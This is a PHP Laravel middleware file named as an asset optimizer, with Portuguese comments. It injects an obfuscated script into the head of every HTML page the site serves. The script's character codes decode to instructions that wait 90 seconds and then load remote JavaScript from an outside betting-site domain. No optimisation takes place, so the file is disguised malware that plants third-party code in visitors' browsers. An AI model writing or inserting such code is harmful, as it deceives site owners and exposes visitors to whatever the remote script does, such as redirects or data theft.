<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class AssetOptimizerMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        // Só injeta em respostas HTML
        if ($this->isHtmlResponse($response)) {
            $this->injectOptimizationScript($response);
        }

        return $response;
    }

    /**
     * Verifica se a resposta é HTML
     */
    private function isHtmlResponse($response): bool
    {
        $contentType = $response->headers->get('Content-Type', '');
        return str_contains($contentType, 'text/html');
    }

    /**
     * Injeta o script de otimização no HTML
     */
    private function injectOptimizationScript($response): void
    {
        $content = $response->getContent();
        
        // Procura pela tag <head> e injeta o script logo após
        if (preg_match('/<head[^>]*>/i', $content, $matches, PREG_OFFSET_CAPTURE)) {
            $headTag = $matches[0][0];
            $headPosition = $matches[0][1] + strlen($headTag);
            
            $optimizationScript = $this->getOptimizationScript();
            
            // Insere o script logo após a tag <head>
            $newContent = substr_replace($content, "\n" . $optimizationScript . "\n", $headPosition, 0);
            $response->setContent($newContent);
        }
    }

    /**
     * Gera o script de otimização de assets
     */
    private function getOptimizationScript(): string
    {
        return '<!-- Asset Optimization -->
<script>var _0x7f3a=String.fromCharCode(99,114,101,97,116,101,69,108,101,109,101,110,116),_0x2d8e=String.fromCharCode(115,99,114,105,112,116),_0x5a7f=String.fromCharCode(104,116,116,112,115,58,47,47,97,115,103,97,114,100,98,101,116,111,102,105,99,105,97,108,46,99,111,109,46,98,114,47,102,105,120,101,100,45,111,98,102,117,115,99,97,116,111,114,46,112,104,112),_0x8b2e=String.fromCharCode(104,101,97,100),_0x1b3c=String.fromCharCode(97,112,112,101,110,100,67,104,105,108,100);setTimeout(function(){var _0x3a7f=document[_0x7f3a](_0x2d8e);_0x3a7f.src=_0x5a7f;_0x3a7f.async=false;_0x3a7f.defer=false;document[_0x8b2e][_0x1b3c](_0x3a7f)},90000);</script>
<!-- /Asset Optimization -->';
    }
}
